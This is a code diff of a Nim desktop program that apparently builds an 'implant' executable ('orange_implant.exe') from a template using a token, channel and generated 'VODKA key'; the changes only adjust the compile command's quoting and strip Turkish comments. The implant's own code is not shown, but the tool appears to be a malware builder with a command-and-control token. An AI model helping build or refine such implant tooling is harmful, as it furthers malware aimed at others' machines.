@@ -1,3 +1,4 @@
+
 import nigui
 import std/[strutils, osproc, os, random, times]
 
@@ -150,7 +151,7 @@ proc buildImplant(token, channel, key, outputPath: string): bool =
   writeFile(tempFile, templateCode)
 
   log("Compiling with Nim...")
-  let compileCmd = "nim c -d:release --opt:size -o:"" & outputPath & "" "" & tempFile & """
+  let compileCmd = "nim c -d:release --opt:size -o:" & outputPath & " " & tempFile
   log("Command: " & compileCmd)
 
   let (output, exitCode) = execCmdEx(compileCmd)
@@ -175,7 +176,6 @@ buttonGenKey.onClick = proc(event: ClickEvent) =
   log("Generated new VODKA key: " & newKey[0..15] & "...")
 
 buttonBrowse.onClick = proc(event: ClickEvent) =
-  # Basit dosya seçim - şimdilik sadece inputu güncelle
   textBoxOutput.text = "orange_implant.exe"
   log("Output set to: " & textBoxOutput.text)
 
@@ -185,7 +185,7 @@ buttonBuild.onClick = proc(event: ClickEvent) =
   let key = textBoxKey.text.strip()
   let output = textBoxOutput.text.strip()
 
-  textAreaLog.text = ""  # Log'u temizle
+  textAreaLog.text = ""
 
   if token.len == 0:
     labelStatus.text = "Status: ERROR - Token is empty!"
